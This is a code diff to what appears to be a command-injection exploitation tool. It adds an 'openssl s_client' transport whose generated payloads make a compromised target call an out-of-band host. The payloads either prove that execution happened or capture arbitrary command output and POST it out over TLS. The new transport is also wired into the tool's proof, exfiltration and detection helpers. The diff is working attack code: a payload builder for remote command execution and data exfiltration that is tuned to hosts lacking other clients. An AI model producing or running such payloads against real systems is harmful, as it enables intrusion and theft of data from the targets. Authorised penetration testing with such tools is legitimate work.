@@ -36,12 +36,12 @@ PLUS = "+"
 """
 The HTTP clients used to reach the out-of-band server, most common first.
 """
-UNIX_TRANSPORTS = ["curl", "wget", "python", "dns", "php", "ruby"]
+UNIX_TRANSPORTS = ["curl", "wget", "python", "dns", "php", "ruby", "openssl"]
 # Clients worth asking for, but not on every boundary of the sweep: each one there costs a request
 # per boundary, and a target either has a client or it does not - which is not a thing a boundary
 # changes. They are asked once a boundary is confirmed, where a target without the common ones still
 # needs something that carries output back whole rather than a name at a time.
-FALLBACK_TRANSPORTS = ("php", "ruby")
+FALLBACK_TRANSPORTS = ("php", "ruby", "openssl")
 # 'curl.exe' leads on Windows, where it has shipped in System32 since Windows 10 1803: unlike a
 # name lookup it carries command output back, and it is quick to give up where a host has no way
 # out. A lookup follows, present on every Windows and the one confirmed against a real target.
@@ -115,6 +115,34 @@ def _ruby_prog(hostname, from_stdin=False, proof=""):
           "h.use_ssl=(u.scheme=='https');h.verify_mode=OpenSSL::SSL::VERIFY_NONE;h." + verb + "\"")
 
 """
+Build the 's_client' command a payload runs, writing the request onto the connection itself.
+
+The client of last resort: a host with no curl, no wget and no interpreter at all still tends to
+have this one, and unlike a raw socket it speaks TLS, so it reaches a server over HTTPS as well.
+
+'-quiet' is deliberately not passed. It implies '-ign_eof', which holds the connection open after
+the request has gone instead of letting it close - and nothing here reads the answer, since what
+proves the command ran is the request arriving at the server, which has happened by then. Left to
+close on end of input, this cannot sit holding one of the target's own workers open waiting.
+"""
+def _openssl_cmd(hostname, cmd=None, proof=""):
+  scheme = settings.OOB_SCHEME or "https"
+  port = str(settings.OOB_PORT or (443 if scheme == "https" else 80))
+  connect = (PIPE + "openssl s_client -connect " + hostname + ":" + port +
+             " -servername " + hostname + " 2>/dev/null")
+  # Double quoted, so the shell works the sum out before 'printf' is handed the request line.
+  if cmd is None:
+    return "printf \"GET /" + proof + " HTTP/1.0\\r\\nHost: " + hostname + "\\r\\n\\r\\n\"" + connect
+  """
+  The output is read into a variable before any of it is sent, because the length has to go in the
+  header that precedes it and '${#name}' is the one way to count it that every POSIX shell has.
+  Sending it without that header would leave the body for the receiving end to read off a closed
+  connection, which is not something an HTTP server is obliged to do.
+  """
+  return ("OOBLEN=$(" + cmd + ");printf \"POST / HTTP/1.0\\r\\nHost: " + hostname +
+          "\\r\\nContent-Length: ${#OOBLEN}\\r\\n\\r\\n%s\" \"$OOBLEN\"" + connect)
+
+"""
 Build the command that makes the target contact a hostname, carrying a sum for it to evaluate.
 """
 def reach_command(transport, hostname, proof="", separator=OR):
@@ -128,6 +156,8 @@ def reach_command(transport, hostname, proof="", separator=OR):
     return _php_prog(hostname, proof=proof)
   if transport == "ruby":
     return _ruby_prog(hostname, proof=proof)
+  if transport == "openssl":
+    return _openssl_cmd(hostname, proof=proof)
   if transport == "dns":
     # Resolving the name is enough to prove execution, and needs no HTTP client at all.
     return dns_lookup_command(hostname, separator)
@@ -220,7 +250,8 @@ def transport_of(payload):
   # that filler back out before looking for one.
   normalized = re.sub(r'""|\^|\\|\$@', "", payload)
   for transport, marker in (("python", "urllib.request"), ("php", "file_get_contents"),
-                            ("ruby", "VERIFY_NONE"), ("dns", "nslookup"), ("curl", "curl"),
+                            ("ruby", "VERIFY_NONE"), ("openssl", "s_client"),
+                            ("dns", "nslookup"), ("curl", "curl"),
                             ("wget", "wget"), ("powershell", "powershell")):
     if marker in normalized:
       return transport
@@ -316,7 +347,7 @@ def heuristic_payload(channel, target_os):
 Report whether a transport can carry a computation the receiving end can check.
 """
 def supports_proof(transport):
-  return transport in ("curl", "wget", "python", "powershell", "php", "ruby")
+  return transport in ("curl", "wget", "python", "powershell", "php", "ruby", "openssl")
 
 """
 Build a sum for the target to evaluate, returned as (expression, expected result, prologue). The
@@ -370,7 +401,7 @@ def proof(transport, plus=PLUS):
 Report whether a transport can carry command output back.
 """
 def supports_exfiltration(transport):
-  return transport in ("curl", "wget", "python", "powershell", "dns", "php", "ruby")
+  return transport in ("curl", "wget", "python", "powershell", "dns", "php", "ruby", "openssl")
 
 """
 Hex characters per label, so a name stays inside the 253 bytes a DNS query has for it. Even, so a
@@ -460,6 +491,10 @@ def exfil_command(transport, hostname, cmd, pipe=PIPE, separator=""):
     return grouped + pipe + _php_prog(hostname, from_stdin=True)
   if transport == "ruby":
     return grouped + pipe + _ruby_prog(hostname, from_stdin=True)
+  if transport == "openssl":
+    # Handed the command rather than a pipe: the length header has to be written before the body,
+    # so the output is counted first instead of being streamed straight onto the connection.
+    return _openssl_cmd(hostname, cmd=cmd)
   if transport == "powershell":
     # Out-String joins the lines into one body.
     return ("powershell.exe -c iwr -Uri " + _url(hostname) + " -Method POST -Body "
